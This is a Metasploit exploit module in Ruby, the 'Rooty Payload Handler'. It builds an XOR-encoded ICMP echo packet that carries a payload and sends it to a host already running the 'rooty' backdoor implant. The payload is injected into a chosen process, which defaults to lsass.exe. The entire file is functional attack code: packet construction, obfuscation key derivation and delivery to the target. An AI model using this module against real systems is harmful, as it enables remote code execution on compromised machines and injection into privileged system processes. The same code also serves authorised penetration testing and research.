##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 <  Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Capture

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Rooty Payload Handler',
      'Description'    => %q{
        This module will send a ICMP "encrypted" packet with a payload to execute to a host running rooty.
      },
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'EXITFUNC' => 'thread', },
      'Author'         =>  ['hal'],
      'References'     =>  [ ],
      'Payload'        =>
        {
          'Space'       => 1500,
          'BadChars'    => '',
          'DisableNops' => true,
        },
      'Platform'       => %w{ linux win },
      'Arch'           => ARCH_ALL,
      'Targets'        => [ [ 'Wildcard Target', { } ] ],
      'DefaultTarget'  => 0
      ))

      register_options(
      [
        OptString.new('SHOST', [false, 'The source address of the ICMP packet', nil]),
        OptString.new('PID', [false, 'The process to inject the shellcode into.  If 0, injects into lsass.exe', 0])
      ], self.class)
      deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')
  end

  def exploit
    open_pcap
    pcap = self.capture
    capture_sendto(build_icmp(), datastore['RHOST'])
    close_pcap
  end


  def build_icmp()
    chksum = rand(65535) + 1
    data = "GOATSE\x03" + [datastore['PID'].to_i].pack('v') + payload.encoded
    key = (chksum & 0xff) ^ ((chksum >> 8) & 0xff)
  
    p = PacketFu::ICMPPacket.new
    p.icmp_type = 8
    p.icmp_code = 0
    p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
    p.ip_daddr = datastore['RHOST']
    p.payload = capture_icmp_echo_pack(rand(65535) + 1, rand(65535) + 1, data.each_byte.map {|c| (c^key).chr }.join)
    p.recalc
    p.icmp_sum = chksum & 0xffff
    return p
  end
end
